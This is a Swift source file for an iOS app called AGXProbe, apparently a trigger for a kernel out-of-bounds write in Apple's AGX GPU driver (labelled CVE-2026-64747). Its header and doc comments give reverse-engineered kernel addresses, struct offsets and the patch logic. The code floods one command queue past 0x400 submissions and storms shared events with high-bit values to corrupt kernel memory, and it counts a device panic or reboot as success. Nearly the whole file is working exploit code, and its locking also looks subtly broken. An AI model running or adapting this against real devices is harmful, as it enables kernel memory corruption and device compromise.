//
//  AGXStress.swift
//  AGXProbe
//
//  Target: CVE-2026-64747 — AGXG14P command queue count-bitmask OOB.
//
//  Reverse-engineering (2026-08-11, decisive):
//    * Vulnerable fn 0xfffffff008003a8c (26.5.2): x1 = 32-bit count bitmask.
//      For every set bit n it writes 0x40 zeroed bytes to obj+0x1040+n*0x40
//      and obj+0x1540+n*0x40 (two slot arrays).  Legal bits are n=0..9;
//      n=10..31 are OOB.  26.6 fix: `orr w8,w2,w1; cmp #0x3ff; b.hi reject`.
//    * The count is NOT accumulated by kernel software.  queue+0x170 and
//      queue+0x700 are GPU firmware/hardware counters — monotonic per queue.
//      Commit fn 0x1d7ec0 feeds `[queue+0x170] & 0xffffff80` → cmd+0xc4 and
//      `[queue+0x700] & 0xffffff80` → cmd+0xc8 with no bounds check.
//    * ==> The trigger: flood ONE queue with >=0x400 submissions so its
//      hardware counter crosses bit10 (0x400).  v2's "many queues, few each"
//      was wrong — the counter is per-queue, not global.
//      The 26.6 patch's existence proves the counter legally passes 0x3ff.
//
//  Build with Xcode on a Mac (free Apple ID 7-day signing is fine), run on
//  the iPhone 13 / iOS 26.5.2 device, press START, watch the log.
//

import Metal
import UIKit
import os

final class AGXStress {

    enum Phase: String, CaseIterable {
        case floodStorm   = "floodStorm   (ONE queue ≥0x400 submits → bit10 OOB)"
        case eventStorm   = "eventStorm   (signal values 0..63)"
        case bitStorm     = "bitStorm     (signal 1<<k, k=0..31)"
        case maskStorm    = "maskStorm    (signal high-bit masks 0x3FF..0xFFFFFFFF)"
        case hugeBatch    = "hugeBatch    (256 buffers one batch, drain once)"
        case inFlight     = "inFlight     (keep 256 in flight)"
        case fenceStorm   = "fenceStorm   (MTLFence signal/update storm)"
        case renderPath   = "renderPath   (render draws + high-bit events)"
        case multiQueue   = "multiQueue   (32 queues, heavy submit)"
        case computeHeavy = "computeHeavy (GPU busy + many buffers)"
        case chainedEvents = "chainedEvents (chain with high-bit values)"
        case mixed        = "mixed        (everything at once)"
    }

    private(set) var logBuffer: String = ""
    private(set) var phase: Phase = .eventStorm
    private(set) var iterations: UInt64 = 0
    private(set) var running = false

    private let device: MTLDevice
    private var logLines: [String] = []
    private var logFileHandle: FileHandle?

    // scratch
    private var queue: MTLCommandQueue!
    private var library: MTLLibrary!
    private var computePipeline: MTLComputePipelineState!
    private var renderPipeline: MTLRenderPipelineState!

    private let lock = NSLock()

    init?() {
        guard let dev = MTLCreateSystemDefaultDevice() else { return nil }
        device = dev
        log("device: \(dev.name) | \(dev.registryID)")
        queue = dev.makeCommandQueue()

        // ---- inline library (no bundled .metal files needed) ----
        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void fill(uint i [[thread_position_in_grid]],
                         device uint *out [[buffer(0)]]) {
            out[i] = (uint)i * 0x9E3779B1u;
        }
        struct VOut { float4 pos [[position]]; };
        vertex VOut vert(uint vid [[vertex_id]]) {
            VOut o;
            float2 p[3] = {float2(-1,-1), float2( 1,-1), float2(0, 1)};
            o.pos = float4(p[vid % 3], 0, 1);
            return o;
        }
        fragment float4 frag(VOut in [[stage_in]]) {
            return float4(1, 0, 0, 1);
        }
        """
        library = try? device.makeLibrary(source: src, options: nil)
        if let lib = library {
            if let fn = try? lib.makeFunction(name: "fill") {
                computePipeline = try? device.makeComputePipelineState(function: fn)
            }
            // render pipeline over an offscreen texture
            let rpd = MTLRenderPipelineDescriptor()
            rpd.vertexFunction = try? lib.makeFunction(name: "vert")
            rpd.fragmentFunction = try? lib.makeFunction(name: "frag")
            rpd.colorAttachments[0].pixelFormat = .bgra8Unorm
            renderPipeline = try? device.makeRenderPipelineState(descriptor: rpd)
        }

        // log file for crash forensics
        if let dir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first {
            let f = dir.appendingPathComponent("agxprobe.log")
            FileManager.default.createFile(atPath: f.path, contents: nil)
            logFileHandle = try? FileHandle(forWritingTo: f)
            log("log file: \(f.path)")
        }
    }

    // MARK: - control

    func start() {
        lock.lock(); defer { lock.unlock() }
        guard !running else { return }
        running = true
        phase = .floodStorm
        iterations = 0
        log("=== AGXProbe START (device \(device.name)) ===")
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            self?.runLoop()
        }
    }

    func stop() {
        lock.lock(); defer { lock.unlock() }
        running = false
        log("=== AGXProbe STOP ===")
    }

    var currentLog: String {
        // try() — never block the main thread on the worker. If the worker is
        // stuck (GPU stall) we return the last known log instead of deadlocking
        // the UI, which would trip the scene-update watchdog and SIGKILL us.
        guard lock.try() else { return logBuffer }
        defer { lock.unlock() }
        return logBuffer
    }

    // MARK: - run loop

    private func runLoop() {
        var guardCounter = 0
        while isRunning() && guardCounter < 60_000_000 {
            let p = currentPhase()
            switch p {
            case .floodStorm:       floodStorm()
            case .eventStorm:       eventStorm()
            case .bitStorm:         bitStorm()
            case .maskStorm:        maskStorm()
            case .hugeBatch:        hugeBatch()
            case .inFlight:         inFlight()
            case .fenceStorm:       fenceStorm()
            case .renderPath:       renderPath()
            case .multiQueue:       multiQueue()
            case .computeHeavy:     computeHeavy()
            case .chainedEvents:    chainedEvents()
            case .mixed:            mixed()
            }
            iterations += 1
            guardCounter += 1
            if iterations.isMultiple(of: 25) {
                log("[iter \(iterations)] phase \(p.rawValue.prefix(12)) live")
            }
            if iterations.isMultiple(of: 120) {
                advancePhase()
            }
            Thread.sleep(forTimeInterval: 0.0005)
        }
        log("run loop exited (guard hit or stopped)")
    }

    private func currentPhase() -> Phase {
        lock.lock(); defer { lock.unlock() }
        return phase
    }

    private func advancePhase() {
        lock.lock(); defer { lock.unlock() }
        let all = Phase.allCases
        let idx = (all.firstIndex(of: phase)! + 1) % all.count
        phase = all[idx]
        log("--- phase -> \(phase.rawValue) ---")
    }

    private func isRunning() -> Bool {
        lock.lock(); defer { lock.unlock() }
        return running
    }

    // MARK: - engines

    /// Phase 0 — THE trigger for CVE-2026-64747 (v3).
    ///
    /// Kernel RE (2026-08-11, decisive): queue+0x170 / queue+0x700 are GPU
    /// *firmware/hardware* counters — no kernel software accumulates them.
    /// Allocator 0x1bd450 and base-class init 0x1c08e0 never write 0x170; the
    /// queue vtable method 0x4aa540 writes [q+0x170]=[q+0x16c]=w1 where w1 comes
    /// from [q+0x174] (cached high word) or a blraa to vtable+0x7a8 (hardware
    /// poll).  Commit fn 0x1d7ec0 reads
    ///   [cmd+0xc4] = [queue+0x170] & 0xffffff80
    ///   [cmd+0xc8] = [queue+0x700] & 0xffffff80
    /// with NO bounds check and feeds vuln fn 0x3a8c / 0x3c20, which treat the
    /// value as a bitmask and copy a 0x40 template to obj+0x1040+n*0x40 and
    /// obj+0x1540+n*0x40 for every set bit n.  Legal bits are 0..9; bit >= 10
    /// (count >= 0x400) writes OOB up to 0x1d40 — still inside the 0x2000
    /// object, over the command-slot pointer fields at 0x12c0..0x1d00.
    /// 26.6 adds `orr w8,w2,w1; cmp #0x3ff; b.hi reject` — Apple admits the
    /// counter legally passes 0x3ff in normal use.
    ///
    /// v2 was WRONG: it spread submissions across many fresh queues, but the
    /// counter is PER-QUEUE monotonic.  v3 floods ONE queue with >=1024 submits
    /// so its hardware counter crosses bit10.  Keep in-flight bounded (<= ring)
    /// via a semaphore so the queue never wedges; then barrier-check for GPU
    /// STALL / panic as the observable trigger signal.
    private func floodStorm() {
        let inflightCap = 64                    // matches a sane default ring width
        let sem = DispatchSemaphore(value: inflightCap)
        let target: UInt64 = 4096               // 4x past 0x400 — covers ring/wrap slack
        var committed: UInt64 = 0
        var stalled = false
        var reported = 0

        // Reuse one scratch pair so 4096 submits don't allocate 4096 live
        // MTLBuffers (the GPU keeps each alive until its buffer completes).
        let pair: (MTLBuffer, MTLBuffer)? = {
            guard let a = device.makeBuffer(length: 64, options: .storageModeShared),
                  let b = device.makeBuffer(length: 64, options: .storageModeShared) else { return nil }
            return (a, b)
        }()

        log("floodStorm: ONE queue → \(target) submits (needs ≥0x400 to set bit10)")
        while committed < target && isRunning() {
            guard let cb = queue.makeCommandBuffer() else { break }
            cb.addCompletedHandler { _ in sem.signal() }
            if let (a, b) = pair, let blit = cb.makeBlitCommandEncoder() {
                a.contents().storeBytes(of: UInt32(committed & 0x3FF), toByteOffset: 0, as: UInt32.self)
                // 8 copies per buffer — if the counter advances per command
                // rather than per buffer, this multiplies the reach by 8.
                for _ in 0..<8 {
                    blit.copy(from: a, sourceOffset: 0, to: b, destinationOffset: 0, size: 64)
                }
                blit.endEncoding()
            }
            cb.commit()
            committed += 1
            if sem.wait(timeout: .now() + 3) == .timedOut {
                stalled = true
                log("!!! floodStorm: in-flight cap never freed at \(committed) — GPU STALL?")
                break
            }
            if committed >= UInt64((reported + 1) * 512) {
                reported += 1
                log("floodStorm: committed=\(committed) live")
            }
        }
        // Final barrier — prove the queue drained, or report the stall.
        let done = DispatchSemaphore(value: 0)
        if let b = queue.makeCommandBuffer() {
            b.addCompletedHandler { _ in done.signal() }
            b.commit()
        }
        let r = done.wait(timeout: .now() + 8)
        log("floodStorm: committed=\(committed) barrier=\(r == .timedOut ? "STALL" : "ok") stalled=\(stalled)")
        // A reboot / panic-full in Analytics is the win signal.  If bit10 fired
        // and the OOB overwrote the 0x12c0..0x1d00 slot fields the app may die
        // or the GPU hang — both are observable trigger confirmations.
    }

    /// Commit a command buffer that signals `event` to `value`.  FIX: do NOT
    /// encodeWaitForEvent on our own signal — IOGPU posts the shared-event
    /// signal at command-buffer *completion*, so signal-then-wait-same-value
    /// in one buffer self-deadlocks the GPU (event stays stale until the
    /// buffer finishes, which the wait itself blocks). Removed.
    private func commitSignal(_ event: MTLSharedEvent, value: UInt64, queue q: MTLCommandQueue, blit: Bool) {
        guard let cb = q.makeCommandBuffer() else { return }
        cb.label = String(format: "sig-%llx", value)
        if blit { blitOn(cb, val: UInt32(value & 0xFFFF_FFFF)) }
        cb.encodeSignalEvent(event, value: value)
        cb.commit()
    }

    /// Phase 1: low-bit shared-event signal values 0..63.
    private func eventStorm() {
        let e = device.makeSharedEvent()!
        for v in 0..<64 {
            commitSignal(e, value: UInt64(v), queue: queue, blit: true)
        }
        _ = waitAll()
    }

    /// Phase 2: signal values that are single high bits (1<<k).  Directly
    /// exercises the "bit index >= 10" OOB range if signal value feeds the mask.
    private func bitStorm() {
        let e = device.makeSharedEvent()!
        for k in 0..<32 {
            let v: UInt64 = 1 << UInt64(k)
            commitSignal(e, value: v, queue: queue, blit: true)
            commitSignal(e, value: v | 0x3FF, queue: queue, blit: true) // mix in valid bits
        }
        _ = waitAll()
    }

    /// Phase 3: signal values that are dense masks with the high bits set.
    private func maskStorm() {
        let e = device.makeSharedEvent()!
        for k in 10..<32 {
            let v: UInt64 = (1 << UInt64(k)) | 0x3FF
            commitSignal(e, value: v, queue: queue, blit: true)
        }
        commitSignal(e, value: 0xFFFF_FFFF, queue: queue, blit: true)
        commitSignal(e, value: 0xFFFF_FFFF_FFFF_FFFF, queue: queue, blit: true)
        _ = waitAll()
    }

    /// Phase 4: ONE huge batch — 256 buffers committed with distinct high-bit
    /// signal values, drained only at the very end so the queue's pending mask
    /// accumulates across the whole batch.
    private func hugeBatch() {
        let e = device.makeSharedEvent()!
        let values: [UInt64] = (0..<256).map { i in
            // bits 10..17 recurring + a spread of low bits
            let high = UInt64(1 << (10 + (i % 8)))
            let low  = UInt64(i) & 0x3FF
            return high | low
        }
        for v in values {
            commitSignal(e, value: v, queue: queue, blit: true)
        }
        // drain once
        _ = waitAll()
    }

    /// Phase 5: keep 256 buffers in flight across multiple commits, no drain
    /// between submits.
    private func inFlight() {
        let e = device.makeSharedEvent()!
        var outstanding = 0
        for i in 0..<300 {
            let v = UInt64((1 << (10 + (i % 8))) | (i & 0x3FF))
            commitSignal(e, value: v, queue: queue, blit: true)
            outstanding += 1
            if outstanding >= 256 {
                _ = waitAll()
                outstanding = 0
            }
        }
        _ = waitAll()
    }

    /// Phase 6: MTLFence signal/update storm (blit encoder path).
    private func fenceStorm() {
        let fences = (0..<48).map { _ in device.makeFence()! }
        guard let cb = queue.makeCommandBuffer() else { return }
        let enc = cb.makeBlitCommandEncoder()
        for (i, f) in fences.enumerated() {
            enc?.updateFence(f)
            enc?.waitForFence(f)
            if i % 4 == 3 { enc?.updateFence(f) }
        }
        enc?.endEncoding()
        cb.commit()
        _ = waitAll()
    }

    /// Phase 7: real render path — offscreen render encoder with draw calls,
    /// high-bit shared-event signal/wait around each pass.
    private func renderPath() {
        guard let pipe = renderPipeline else { return }
        let e = device.makeSharedEvent()!
        let texDesc = MTLTextureDescriptor.texture2DDescriptor(
            pixelFormat: .bgra8Unorm, width: 256, height: 256, mipmapped: false)
        guard let tex = device.makeTexture(descriptor: texDesc) else { return }

        for k in 0..<24 {
            let v: UInt64 = 1 << UInt64(k) // includes k >= 10
            guard let cb = queue.makeCommandBuffer() else { return }
            let pass = MTLRenderPassDescriptor()
            pass.colorAttachments[0].texture = tex
            pass.colorAttachments[0].loadAction = .dontCare
            pass.colorAttachments[0].storeAction = .store
            cb.encodeSignalEvent(e, value: v)
            guard let enc = cb.makeRenderCommandEncoder(descriptor: pass) else { continue }
            enc.setRenderPipelineState(pipe)
            enc.drawPrimitives(type: .triangle, vertexStart: 0, vertexCount: 3)
            enc.endEncoding()
            // no encodeWaitForEvent on our own signal (same self-deadlock as commitSignal)
            cb.commit()
        }
        _ = waitAll()
    }

    /// Phase 8: many queues each hammering with high-bit events.
    private func multiQueue() {
        let queues = (0..<32).map { _ in device.makeCommandQueue()! }
        for (qi, q) in queues.enumerated() {
            let e = device.makeSharedEvent()!
            for k in 0..<8 {
                let v = UInt64(1 << (10 + ((qi + k) % 12)))
                commitSignal(e, value: v, queue: q, blit: true)
            }
        }
        for q in queues {
            let sem = DispatchSemaphore(value: 0)
            let cb = q.makeCommandBuffer()!
            cb.addCompletedHandler { _ in sem.signal() }
            cb.commit()
            _ = sem.wait(timeout: .now() + 0.5)
        }
    }

    /// Phase 9: heavy compute to generate sustained command-buffer churn.
    private func computeHeavy() {
        guard let pipe = computePipeline else { return }
        let n = 1 << 20
        guard let buf = device.makeBuffer(length: n * 4, options: .storageModeShared),
              let cb = queue.makeCommandBuffer(),
              let enc = cb.makeComputeCommandEncoder() else { return }
        enc.setComputePipelineState(pipe)
        enc.setBuffer(buf, offset: 0, index: 0)
        let tg = pipe.maxTotalThreadsPerThreadgroup
        enc.dispatchThreads(MTLSize(width: n, height: 1, depth: 1),
                            threadsPerThreadgroup: MTLSize(width: min(256, Int(tg)), height: 1, depth: 1))
        enc.endEncoding()
        cb.commit()
        _ = waitAll()
    }

    /// Phase 10: chained shared-event signals, high-bit values 1<<(8..24).
    private func chainedEvents() {
        let e = device.makeSharedEvent()!
        for k in 8..<25 {
            let v = UInt64(1 << UInt64(k))
            commitSignal(e, value: v, queue: queue, blit: false)
        }
        _ = waitAll()
    }

    /// Phase 11: all engines concurrently (max noise).
    private func mixed() {
        let group = DispatchGroup()
        group.enter(); DispatchQueue.global().async { self.bitStorm(); group.leave() }
        group.enter(); DispatchQueue.global().async { self.fenceStorm(); group.leave() }
        group.enter(); DispatchQueue.global().async { self.computeHeavy(); group.leave() }
        group.enter(); DispatchQueue.global().async { self.renderPath(); group.leave() }
        _ = group.wait(timeout: .now() + 0.3)
    }

    // MARK: - helpers

    private func blitOn(_ cb: MTLCommandBuffer, val: UInt32) {
        guard let blit = cb.makeBlitCommandEncoder(),
              let a = device.makeBuffer(length: 64, options: .storageModeShared),
              let b = device.makeBuffer(length: 64, options: .storageModeShared) else { return }
        a.contents().storeBytes(of: val, toByteOffset: 0, as: UInt32.self)
        blit.copy(from: a, sourceOffset: 0, to: b, destinationOffset: 0, size: 64)
        blit.endEncoding()
    }

    private func waitAll() -> Bool {
        guard let barrier = queue.makeCommandBuffer() else { return false }
        let sem = DispatchSemaphore(value: 0)
        barrier.addCompletedHandler { _ in sem.signal() }
        barrier.commit()
        let r = sem.wait(timeout: .now() + 8)
        if r == .timedOut {
            log("!!! GPU STALL — barrier did not complete in 8s (phase \(phase.rawValue))")
            return false
        }
        return true
    }

    private func log(_ s: String) {
        let ts = DateFormatter.localizedString(from: Date(), dateStyle: .none, timeStyle: .medium)
        let line = "[\(ts)] \(s)"
        lock.lock()
        logLines.append(line)
        if logLines.count > 400 { logLines.removeFirst(logLines.count - 400) }
        logBuffer = logLines.joined(separator: "\n")
        lock.unlock()
        NSLog("%@", line)
        if let h = logFileHandle {
            let d = (line + "\n").data(using: .utf8)!
            h.seekToEndOfFile()
            h.write(d)
        }
    }
}
